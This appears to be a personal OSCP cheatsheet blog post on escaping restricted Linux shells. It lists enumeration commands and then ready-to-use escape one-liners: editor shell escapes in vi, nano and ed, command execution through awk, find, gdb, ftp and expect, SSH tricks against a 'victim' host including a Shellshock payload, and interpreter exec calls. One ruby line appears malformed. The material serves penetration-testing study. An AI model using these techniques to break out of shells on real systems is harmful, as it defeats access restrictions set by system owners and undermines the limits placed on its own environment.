---
title: Escaping Jailed Shells
date: 2020-06-26 13:17:48
tags: [oscp, cheatsheet, linux]
---

# Escaping Jailed Shells

*You can execute in-built shell commands, as well as the ones in your PATH*

## Enumerate
* Get environment variables: `env` or `printenv` 
* Any programs as different user: `sudo -l`
* Check current PATH: `echo $PATH`
* List contents of PATH:
    * `ls path/to/PATH`
    * `echo path/to/PATH/*`
* List export variables: `export -p`

## Research
**Research each executable command, look for odd parameters**
Check out:
* man pages
* GTFOBins
* Vulnerabilities in the command

## Attack Vectors
* If "/" is allowed, `/bin/bash`

### Writable PATH
* If PATH is writable, game on!
    * `export PATH=/usr/local/bin:/usr/bin:/bin:$PATH`

### Editors
* vi, vim, man, less, more
``` bash
:set shell=/bin/bash
:shell
# or
:!/bin/bash
```
* nano
``` bash
# Control - R, Control - X
^R^X
reset; sh 1>&0 2>&0
```
* ed
`!'/bin/sh'`

### Common Tools
``` bash
# cp
cp /bin/sh /current/PATH

# ftp
ftp
ftp>!/bin/sh

# gdb
gdb
(gdb)!/bin/sh

# awk
awk 'BEGIN {system("/bin/bash")}'

# find
find / -name bleh -exec /bin/bash \;

# expect
expect
spawn sh
```

### SSH
``` bash
# exec commands before remote shell are loaded
ssh test@victim -t "/bin/sh"

# start ssh without loading any profile
ssh test@victim -t "bash --noprofile"

# try shellshock
ssh test@victim -t "() { :; }; /bin/bash"
```

### Scripting Languages
``` bash
# python
python -c 'import os;os.system("/bin/bash")'

# perl
perl -e 'exec "/bin/sh";'

# ruby
ruby -e 'exec /bin/sh'
```

### Writing To a File
``` bash
echo "hello world!" | tee hello.sh
echo "append to the same file" | tee -a hello.sh
```

## Resources
[SANS](https://www.sans.org/blog/escaping-restricted-linux-shells/)
[Hacking Articles](https://www.hackingarticles.in/multiple-methods-to-bypass-restricted-shell/)
[Escape From SHELLcatraz](https://speakerdeck.com/knaps/escape-from-shellcatraz-breaking-out-of-restricted-unix-shells)